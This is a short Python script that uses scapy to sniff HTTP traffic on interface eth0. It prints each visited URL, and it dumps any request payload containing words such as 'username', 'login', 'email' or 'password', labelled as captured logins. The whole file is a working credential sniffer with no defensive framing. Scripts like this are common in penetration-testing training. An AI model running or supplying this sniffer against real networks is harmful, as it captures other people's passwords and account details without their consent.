#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import re

def sniff(inter):
	scapy.sniff(iface=inter, store=False, prn=procSniffPack)
	
def procSniffPack(pack):
	if pack.haslayer(http.HTTPRequest):
		url = str(pack[http.HTTPRequest].Host + pack[http.HTTPRequest].Path)
		print("[+] URL >> " + url)
	
		if pack.haslayer(scapy.Raw):
			load = str(pack[scapy.Raw].load)
			keyLoad = ["username", "user", "login", "email", "e-mail", "password", "pass"]
			for item in keyLoad:
				if item in load:
					print("[!] LOG/PASS: " + load)
					break
		
sniff("eth0")
